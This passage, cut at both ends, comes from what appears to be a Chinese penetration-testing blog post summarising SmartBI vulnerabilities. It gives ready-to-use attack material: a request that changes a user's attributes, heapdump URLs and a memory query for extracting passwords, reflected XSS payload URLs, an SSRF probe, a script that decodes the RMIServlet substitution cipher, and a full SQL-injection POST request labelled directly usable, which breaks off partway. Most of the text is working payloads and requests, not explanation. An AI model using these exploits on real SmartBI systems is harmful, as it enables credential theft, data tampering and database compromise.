class="line">className&#x3D;UserService&amp;methodName&#x3D;addUserAttribute&amp;params&#x3D;[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;SYSTEM_user_isEdit&quot;,&quot;0&quot;,null]</span><br></pre></td></tr></table></figure><p>其中I8a94ca4e0175ab4aab4aaae90175d3e824c66a87为用户的id字段，唯一身份标识</p><h2 id="heapdump缓存抓取密码"><a href="#heapdump缓存抓取密码" class="headerlink" title="heapdump缓存抓取密码"></a>heapdump缓存抓取密码</h2><p><a href="https://127.0.0.1/vision/monitor/heapdump.jsp">https://127.0.0.1/vision/monitor/heapdump.jsp</a></p><p><a href="https://127.0.0.1/vision/monitor/heapdump.jsp?dumpbin=true">https://127.0.0.1/vision/monitor/heapdump.jsp?dumpbin=true</a></p><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112105618667.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112105618667.png" alt="image-20210112105618667"></a></p><p>使用Eclipse Memory Analyzer解析内存文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112114052304.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112114052304.png" alt="image-20210112114052304"></a></p><h2 id="反射型-存储型XSS"><a href="#反射型-存储型XSS" class="headerlink" title="反射型/存储型XSS"></a>反射型/存储型XSS</h2><p><a href="https://127.0.0.1/vision/chooser.jsp?key=">&root=/u01/data/domains/app_domain">https://127.0.0.1/vision/chooser.jsp?key=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&amp;root=/u01/data/domains/app_domain</a></p><p><a href="https://127.0.0.1/vision/monitor/testmailserver.jsp?host=mail.longtop.com&user=111">&pass=123456">https://127.0.0.1/vision/monitor/testmailserver.jsp?host=mail.longtop.com&amp;user=111%22%3E%3Cimg%20src=x%20onerror=prompt(0)%3E&amp;pass=123456</a></p><p>登录后个人参数位置，加密后传参可导致存储型xss</p><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112184359942.png"><img src="http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112184359942.png" alt="image-20210112184359942"></a></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>探测出口ip：</p><p><a href="https://127.0.0.1/vision/monitor/testmailserver.jsp">https://127.0.0.1/vision/monitor/testmailserver.jsp</a></p><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112183515813.png"><img src="http://b0urne.top/2021/01/12/smartBi%E6%80%BB%E7%BB%93/image-20210112183515813.png" alt="image-20210112183515813"></a></p><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112183534916.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112183534916.png" alt="image-20210112183534916"></a></p><h1 id="RMIServet加解密"><a href="#RMIServet加解密" class="headerlink" title="RMIServet加解密"></a>RMIServet加解密</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import unquote</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">ENCODING_SCHEDULE &#x3D; &#123;</span><br><span class="line">    &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;&#39;&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;, </span><br><span class="line">    &quot;%&quot;: &quot;&#x2F;&quot;, &quot;&#39;&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;, </span><br><span class="line">    &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;, </span><br><span class="line">    &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;, </span><br><span class="line">    &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;, </span><br><span class="line">    &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;, </span><br><span class="line">    &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: &quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;, </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DECODING_SCHEDULE &#x3D; &#123;</span><br><span class="line">    &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;&#39;&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;, </span><br><span class="line">    &quot;&#x2F;&quot;: &quot;%&quot;, &quot;n&quot;: &quot;&#39;&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;, </span><br><span class="line">    &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: &quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;, </span><br><span class="line">    &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;, </span><br><span class="line">    &quot;U&quot;: &quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;, </span><br><span class="line">    &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;, </span><br><span class="line">    &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;, </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#此函数可以用来加密明文也可以解密服务器返回的密文</span><br><span class="line">def encode(code):</span><br><span class="line">    out &#x3D; &quot;&quot;</span><br><span class="line">    for item in code:</span><br><span class="line">        out &#x3D; out + ENCODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def decode(code):</span><br><span class="line">    out &#x3D; &quot;&quot;</span><br><span class="line">    for item in code:</span><br><span class="line">        out &#x3D; out + DECODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">    with open(&#39;read.txt&#39;, &#39;r&#39;) as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line">a&#x3D;read()</span><br><span class="line">b &#x3D; decode(a)</span><br><span class="line">c &#x3D; encode(a)</span><br><span class="line">print(&#39;Input:     &#39; + a + &#39;\n&#39;)</span><br><span class="line">print(&#39;decode:    &#39; + b + &#39;\n&#39;)</span><br><span class="line">print(&#39;decode-unquote-url:   &#39;+unquote(b,&#39;utf-8&#39;))</span><br><span class="line">print()</span><br><span class="line">print(&#39;encode:   &#39;+c)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p>注：加密和解密的过程就是替换字符的过程，最终解密得到的是url编码，加密时传入的文本也要是url编码</p><p>decode-unquote-url只是为了方便阅读</p><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112123136822.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112123136822.png" alt="image-20210112123136822"></a></p><h1 id="SQl注入"><a href="#SQl注入" class="headerlink" title="SQl注入"></a>SQl注入</h1><p>需要登录，任意报表功能</p><p><a href="http://b0urne.top/2021/01/12/smartBi总结/image-20210112183048585.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210112183048585.png" alt="image-20210112183048585"></a></p><p><a href="https://127.0.0.1/vision/ssreportServlet">https://127.0.0.1/vision/ssreportServlet</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;vision&#x2F;ssreportServlet HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;99.0.7113.93 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https:&#x2F;&#x2F;127.0.0.1&#x2F;vision&#x2F;openresource.jsp?iPad&#x3D;true&amp;refresh&#x3D;true&amp;showtoolbar&#x3D;false&amp;showPath&#x3D;false&amp;resid&#x3D;I40281d81016a8bc28bc20231016aaee007b230ac&amp;_timestamp&#x3D;1610433924926</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 3293</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQPassword&#x3D;; JSESSIONID&#x3D;4BB550BF10C606619B753D3CE52CD3AB</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">sheetIndex&#x3D;0&amp;resid&#x3D;I40281d81016a8bc28bc20231016aaee007b230ac&amp;clientId&#x3D;Iff8080810176f0c7f0c7544f0176f54eb72c1160&amp;refreshType&#x3D;refresh&amp;paramsInfoEncode&#x3D;encode&#x3D;&#x2F;JV&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aJ&#x2F;&#39;T&#x2F;mJ&#x2F;aK&#x2F;VT&#x2F;&#39;T&#x2F;aJ&#x2F;m7&#x2F;&#39;T&#x2F;a9&#x2F;O9&#x2F;V7&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;&#39;T&#x2F;mJ&#x2F;aK&#x2F;VT&#x2F;&#39;T&#x2F;aJ&#x2F;m7&#x2F;&#39;T&#x2F;a9&#x2F;O9&#x2F;V7&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;&#39;T&#x2F;mJ&#x2F;aK&#x2F;VT&#x2F;&#39;T&#x2F;aJ&#x2F;m7&#x2F;&#39;T&#x2F;a9&#x2F;O9&#x2F;V7&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uun111&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uun111&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;V1&#x2F;ma&#x2F;aM&#x2F;mt&#x2F;VO&#x2F;aM&#x2F;ma&#x2F;&#39;K&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;V1&#x2F;ma&#x2F;aM&#x2F;mt&#x2F;VO&#x2F;aM&#x2F;ma&#x2F;&#39;K&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;V1&#x2F;ma&#x2F;aM&#x2F;mt&#x2F;VO&#x2F;aM&#x2F;ma&#x2F;&#39;K&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;a9&#x2F;mt&#x2F;&#39;1&#x2F;aK&#x2F;VV&#x2F;VT&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;a9&#x2F;mt&#x2F;&#39;1&#x2F;aK&#x2F;VV&#x2F;VT&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;a9&#x2F;mt&#x2F;&#39;1&#x2F;aK&#x2F;VV&#x2F;VT&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uuKK7777&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;Vm&#x2F;Vx&#x2F;aK&#x2F;V&#39;&#x2F;mt&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;mt&#x2F;V7&#x2F;aJ&#x2F;V&#39;&#x2F;&#39;u&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;mt&#x2F;V7&#x2F;aJ&#x2F;V&#39;&#x2F;&#39;u&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;mt&#x2F;V7&#x2F;aJ&#x2F;V&#39;&#x2F;&#39;u&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;&#39;J&#x2F;O&#39;&#x2F;am&#x2F;&#39;N&#x2F;O&#39;&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;&#39;t&#x2F;VO&#x2F;aJ&#x2F;&#39;a&#x2F;Vx&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;&#39;t&#x2F;VO&#x2F;aJ&#x2F;&#39;a&#x2F;Vx&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;&#39;m&#x2F;&#39;7&#x2F;aJ&#x2F;mt&#x2F;O&#39;&#x2F;aJ&#x2F;&#39;t&#x2F;VO&#x2F;aJ&#x2F;&#39;a&#x2F;Vx&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;&#39;J&#x2F;O&#39;&#x2F;am&#x2F;&#39;N&#x2F;O&#39;&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~MqRh&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uuRh&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;ON&#x2F;&#39;7&#x2F;aM&#x2F;VJ&#x2F;&#39;V&#x2F;aM&#x2F;mt&#x2F;VO&#x2F;aM&#x2F;ma&#x2F;&#39;KRh&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aJ&#x2F;O1&#x2F;OV&#x2F;aM&#x2F;&#39;O&#x2F;OJ&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;a&#39;&#x2F;VJ&#x2F;V9&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;ut&#x2F;9V&#x2F;uuRh&#x2F;uu&#x2F;NO&#x2F;uuoQk5QkL(4(dpkp4qcK7u&#39;1h&#39;171M(&#39;~iu&#39;~iu7uN171M((7~pu1m9u&#39;~Mq&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uu6(dp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uu(SR(D&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;aM&#x2F;mV&#x2F;VK&#x2F;aM&#x2F;mM&#x2F;V7&#x2F;aM&#x2F;m9&#x2F;VM&#x2F;am&#x2F;m9&#x2F;VK&#x2F;aM&#x2F;OT&#x2F;Ou&#x2F;uu&#x2F;ut&#x2F;uug(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;ut&#x2F;uuhRD5S(2Z(SQp&#x2F;uu&#x2F;NO&#x2F;uu&#x2F;uu&#x2F;9T&#x2F;JT&amp;pageId&#x3D;0&amp;writeBackData&#x3D;&amp;exportSheetIndexes&#x3D;&amp;exportId&#x3D;&amp;op&#x3D;%7B%22getTotalPages%22%3Atrue%2C%22sheetPageCounts%22%3A%5B1%5D%7D</span><br></pre></td></tr></table></figure><h2 id="解码并修改数据包直接注入（可直接使用）"><a href="#解码并修改数据包直接注入（可直接使用）" class="headerlink" title="解码并修改数据包直接注入（可直接使用）"></a>解码并修改数据包直接注入（可直接使用）</h2><p>修改paramsInfoEncode为paramsInfo，将Encode参数去掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td 